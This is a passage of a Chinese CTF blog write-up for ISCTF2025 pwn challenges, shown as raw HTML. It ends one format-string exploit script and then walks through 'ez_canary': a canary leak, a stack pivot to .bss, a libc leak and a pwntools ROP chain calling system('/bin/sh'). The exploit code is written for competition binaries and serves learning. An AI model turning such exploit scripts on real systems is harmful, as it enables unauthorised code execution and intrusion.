class="built_in">str</span>(one_gadget_1).encode(<span class="string">&quot;utf-8&quot;</span>) + <span class="string">b&quot;c%12$hn&quot;</span></span><br><span class="line">payload2+=<span class="string">b&quot;%&quot;</span> + <span class="built_in">str</span>(one_gadget_5).encode(<span class="string">&quot;utf-8&quot;</span>) + <span class="string">b&quot;c%47$hn&quot;</span></span><br><span class="line">payload2+=<span class="string">b&quot;%&quot;</span> + <span class="built_in">str</span>(one_gadget_6).encode(<span class="string">&quot;utf-8&quot;</span>) + <span class="string">b&quot;c%46$hn&quot;</span></span><br><span class="line">payload2+=<span class="string">b&quot;%&quot;</span> + <span class="built_in">str</span>(rbp).encode(<span class="string">&quot;utf-8&quot;</span>) + <span class="string">b&quot;c%44$hn&quot;</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">19</span>,<span class="number">0x100</span>,payload1)</span><br><span class="line">add(<span class="number">20</span>,<span class="number">0x100</span>,payload2)</span><br><span class="line"></span><br><span class="line">show(<span class="number">19</span>)</span><br><span class="line">show(<span class="number">20</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="ez_canary">ez_canary</h3>
<p>保护如下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"> ~/ISCTF/ez_canary  checksec ./pwn                                                                                                 </span><br><span class="line">[*] <span class="string">&#x27;/home/ubuntu/ISCTF/ez_canary/pwn&#x27;</span></span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      Canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x400000)</span><br><span class="line">    SHSTK:      Enabled</span><br><span class="line">    IBT:        Enabled</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure>
<p>函数如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">pthread_t</span> newthread[<span class="number">2</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  newthread[<span class="number">1</span>] = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to Kris&#x27;s program!&quot;</span>);</span><br><span class="line">  pthread_create(newthread, <span class="number">0LL</span>, vuln, <span class="number">0LL</span>);</span><br><span class="line">  pthread_join(newthread[<span class="number">0</span>], <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *__fastcall <span class="title function_">vuln</span><span class="params">(<span class="type">void</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  _QWORD buf[<span class="number">6</span>]; <span class="comment">// [rsp+10h] [rbp-150h] BYREF</span></span><br><span class="line">  __int16 v3; <span class="comment">// [rsp+40h] [rbp-120h]</span></span><br><span class="line">  _QWORD buf_1[<span class="number">34</span>]; <span class="comment">// [rsp+50h] [rbp-110h] BYREF</span></span><br><span class="line"></span><br><span class="line">  buf_1[<span class="number">33</span>] = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(buf_1, <span class="number">0</span>, <span class="number">256</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please enter your name &gt;&gt;&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x1000u</span>LL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Your name: %s&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)buf);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please enter your content &gt;&gt;&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf_1, <span class="number">0x1000u</span>LL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Your content: %s&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)buf_1);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>一样是先覆盖canary低字节泄露canary</p>
<p>然后栈迁移到bss段上，返回vuln函数，让buf的地址刚好是stderr，再覆盖低一字节，泄露出libc地址</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.bss:0000000000404080                 public stderr@GLIBC_2_2_5</span><br><span class="line">.bss:0000000000404080 ; FILE *stderr</span><br><span class="line">.bss:0000000000404080 stderr@GLIBC_2_2_5 dq ?                 ; DATA XREF: LOAD:0000000000400500↑o</span><br><span class="line">.bss:0000000000404080                                         ; init+30↑r</span><br><span class="line">.bss:0000000000404080                                         ; Alternative name is &#x27;stderr&#x27;</span><br><span class="line">.bss:0000000000404080                                         ; Copy of shared data</span><br></pre></td></tr></table></figure>
<p>得到libc地址后，准备再次栈迁移，抬高栈地址给system函数</p>
<p>设置好偏移和rop链就可以了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p=start()</span><br><span class="line">bss_addr=<span class="number">0x404080</span></span><br><span class="line">p.recvuntil(<span class="string">b&quot;Please enter your name &gt;&gt;\n&quot;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x149</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;a&quot;</span>*<span class="number">0x149</span>)</span><br><span class="line">canary=u64(<span class="string">b&quot;\x00&quot;</span>+p.recv(<span class="number">7</span>))</span><br><span class="line">log.success(<span class="built_in">hex</span>(canary))</span><br><span class="line">payload1=<span class="string">b&quot;a&quot;</span>*<span class="number">0x108</span>+p64(canary)+p64(bss_addr+<span class="number">0x150</span>)+p64(<span class="number">0x4013E3</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;Please enter your content &gt;&gt;\n&quot;</span>)</span><br><span class="line">p.send(payload1)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;Please enter your name &gt;&gt;\n&quot;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;\xa0&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;\xa0&quot;</span>)</span><br><span class="line">libc_base=u64(<span class="string">b&quot;\xa0&quot;</span>+p.recv(<span class="number">5</span>).ljust(<span class="number">7</span>,<span class="string">b&quot;\x00&quot;</span>))-libc.sym[<span class="string">&quot;_IO_2_1_stderr_&quot;</span>]</span><br><span class="line">log.success(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;Please enter your content &gt;&gt;\n&quot;</span>)</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">payload2=<span class="string">b&quot;a&quot;</span>*<span class="number">0x108</span>+p64(canary)+p64(bss_addr+<span class="number">0x840</span>)+p64(<span class="number">0x401492</span>)</span><br><span class="line">payload2=payload2.ljust(<span class="number">0x6f0</span>,<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">payload2+=p64(bss_addr+<span class="number">0x750</span>)+p64(libc_base+<span class="number">0x2a3e5</span>)+p64(binsh_addr)+p64(<span class="number">0x401493</span>)+p64(system_addr)</span><br><span class="line">payload2=payload2.ljust(<span class="number">0x7f8</span>,<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">payload2+=p64(canary)+p64(bss_addr+<span class="number">0x800</span>-<span class="number">0x110</span>+<span class="number">0x40</span>)+p64(<span class="number">0x401492</span>)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.send(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://LightCloveyou.github.io">LightCloveyou</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://lightcloveyou.github.io/2025/12/07/ISCTF2025/">https://lightcloveyou.github.io/2025/12/07/ISCTF2025/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://LightCloveyou.github.io" target="_blank">LightCloveyou's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a></div><div class="post-share"><div class="social-share" data-image="/img/33.jpg" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/12/08/kernel/" title="kernel"><img class="cover" src="/img/44.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">kernel</div></div><div class="info-2"><div class="info-item-1">学如逆水行舟，不进则退</div></div></div></a><a class="pagination-related  no-desc" href="/2025/11/28/Assembly/" title="Assembly"><img class="cover" src="/img/20.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">Assembly</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related no-desc" href="/2026/01/31/UniCTF2026/" title="UniCTF2026"><img class="cover" src="/img/48.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-01-31</div><div class="info-item-2">UniCTF2026</div></div></div></a><a class="pagination-related" href="/2025/10/27/Whuctf2025/" title="Whuctf2025"><img class="cover" src="/img/6.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-10-27</div><div class="info-item-2">Whuctf2025</div></div><div class="info-2"><div class="info-item-1">凡是有意义的事都不会容易，真正有意义的事从来没有简单二字</div></div></div></a><a class="pagination-related" href="/2025/10/12/Moectf2025-pwn/" title="Moectf2025 pwn"><img class="cover" src="/img/1.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-10-12</div><div class="info-item-2">Moectf2025 pwn</div></div><div class="info-2"><div class="info-item-1">选择你喜欢的，坚持你选择的，热爱你坚持的</div></div></div></a><a class="pagination-related" href="/2025/10/30/heap-all-in-one/" title="heap-all-in-one"><img class="cover" src="/img/12.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-10-30</div><div class="info-item-2">heap-all-in-one</div></div><div class="info-2"><div class="info-item-1">永不放弃，永不停止</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">LightCloveyou</div><div class="author-info-description">PWN your Heart</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">12</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">4</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/LightCloveyou/LightCloveyou.github.io"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#isctf2025-pwn"><span class="toc-number">1.</span> <span class="toc-text">ISCTF2025 PWN</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sign"><span class="toc-number">1.0.1.</span> <span class="toc-text">sign</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ret2rop"><span class="toc-number">1.0.2.</span> <span class="toc-text">ret2rop</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ez2048"><span class="toc-number">1.0.3.</span> <span class="toc-text">ez2048</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ez_tcache_attachment"><span class="toc-number">1.0.4.</span> <span class="toc-text">ez_tcache_attachment</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ez_fmt"><span class="toc-number">1.0.5.</span> <span class="toc-text">ez_fmt</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#my_vm"><span class="toc-number">1.0.6.</span> <span class="toc-text">my_vm</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ez_stack"><span class="toc-number">1.0.7.</span> <span class="toc-text">ez_stack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#heap"><span class="toc-number">1.0.8.</span> <span class="toc-text">heap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ez_canary"><span class="toc-number">1.0.9.</span> <span class="toc-text">ez_canary</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2026/01/31/UniCTF2026/" title="UniCTF2026"><img src="/img/48.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="UniCTF2026"/></a><div class="content"><a class="title" href="/2026/01/31/UniCTF2026/" title="UniCTF2026">UniCTF2026</a><time datetime="2026-01-31T05:21:38.000Z" title="发表于 2026-01-31 13:21:38">2026-01-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/12/21/%E6%B5%85%E8%B0%88C%E8%AF%AD%E8%A8%80%E7%9A%84%E5%A4%A7%E6%95%B4%E6%95%B0%E5%BA%93%E5%AE%9E%E7%8E%B0/" title="浅谈C语言的大整数库实现"><img src="/img/47.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="浅谈C语言的大整数库实现"/></a><div class="content"><a class="title" href="/2025/12/21/%E6%B5%85%E8%B0%88C%E8%AF%AD%E8%A8%80%E7%9A%84%E5%A4%A7%E6%95%B4%E6%95%B0%E5%BA%93%E5%AE%9E%E7%8E%B0/" title="浅谈C语言的大整数库实现">浅谈C语言的大整数库实现</a><time datetime="2025-12-21T12:21:07.000Z" title="发表于 2025-12-21 20:21:07">2025-12-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/12/12/StackSkill/" title="StackSkill"><img src="/img/39.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="StackSkill"/></a><div class="content"><a class="title" href="/2025/12/12/StackSkill/" title="StackSkill">StackSkill</a><time datetime="2025-12-12T08:02:02.000Z" title="发表于 2025-12-12 16:02:02">2025-12-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/12/08/kernel/" title="kernel"><img src="/img/44.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="kernel"/></a><div class="content"><a class="title" href="/2025/12/08/kernel/" title="kernel">kernel</a><time datetime="2025-12-08T08:49:01.000Z" title="发表于 2025-12-08 16:49:01">2025-12-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/12/07/ISCTF2025/" title="ISCTF2025"><img src="/img/33.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ISCTF2025"/></a><div class="content"><a class="title" href="/2025/12/07/ISCTF2025/" title="ISCTF2025">ISCTF2025</a><time datetime="2025-12-06T16:26:57.000Z" title="发表于 2025-12-07 00:26:57">2025-12-07</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/13.jpg);"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By LightCloveyou</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.0.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.2</a></span></div></div><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
</script></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.2"></script><script src="/js/main.js?v=5.5.2"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@6.1.4/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar@0.1.16/dist/snackbar.min.js"></script><div class="js-pjax"></div><meting-js class="no-destroy" id="8932390" server="netease" type="playlist" fixed="true" autoplay="false" order="random" volume="0.3" list-folded="false" list-max-height="36vh"> </meting-js><link rel="stylesheet" href="https://npm.elemecdn.com/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://npm.elemecdn.com/aplayer/dist/APlayer.min.js"></script><script src="https://npm.elemecdn.com/meting/dist/Meting.min.js"></script><script>(() => {
  const destroyAplayer = () => {
    if (window.aplayers) {
      for (let i = 0; i < window.aplayers.length; i++) {
        if (!window.aplayers[i].options.fixed) {
          window.aplayers[i].destroy()
        }
      }
    }
  }

  const runMetingJS = () => {
    typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
  }

  btf.addGlobalFn('pjaxSend', destroyAplayer, 'destroyAplayer')
  btf.addGlobalFn('pjaxComplete', loadMeting, 'runMetingJS')
})()</script><script src="https://cdn.bootcdn.net/ajax/libs/jquery.pjax/2.0.1/jquery.pjax.min.js"></script><script>(() => {
  const pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]

  window.pjax = new Pjax({
    elements: 'a:not([target="_blank"])',
    selectors: pjaxSelectors,
    cacheBust: false,
    analytics: false,
    scrollRestoration: false
  })

  const triggerPjaxFn = (val) => {
    if (!val) return
    Object.values(val).forEach(fn => {
      try {
        fn()
      } catch (err) {
        console.debug('Pjax callback failed:', err)
      }
    })
  }

  document.addEventListener('pjax:send', () => {
    // removeEventListener
    btf.removeGlobalFnEvent('pjaxSendOnce')
    btf.removeGlobalFnEvent('themeChange')

    // reset readmode
    const $bodyClassList = document.body.classList
    if ($bodyClassList.contains('read-mode')) $bodyClassList.remove('read-mode')

    triggerPjaxFn(window.globalFn.pjaxSend)
  })

  document.addEventListener('pjax:complete', () => {
    btf.removeGlobalFnEvent('pjaxCompleteOnce')
    document.querySelectorAll('script[data-pjax]').forEach(item => {
      const newScript = document.createElement('script')
      const content = item.text || item.textContent || item.innerHTML || ""
      Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
      newScript.appendChild(document.createTextNode(content))
      item.parentNode.replaceChild(newScript, item)
    })

    triggerPjaxFn(window.globalFn.pjaxComplete)
  })

  document.addEventListener('pjax:error', e => {
    if (e.request.status === 404) {
      const usePjax = true
      false
        ? (usePjax ? pjax.loadUrl('/404.html') : window.location.href = '/404.html')
        : window.location.href = e.request.responseURL
    }
  })
})()</script><script async data-pjax src="/"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="local-search-input"><input placeholder="搜索文章" type="text"/></div><hr/><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=5.5.2"></script></div></div></body></html>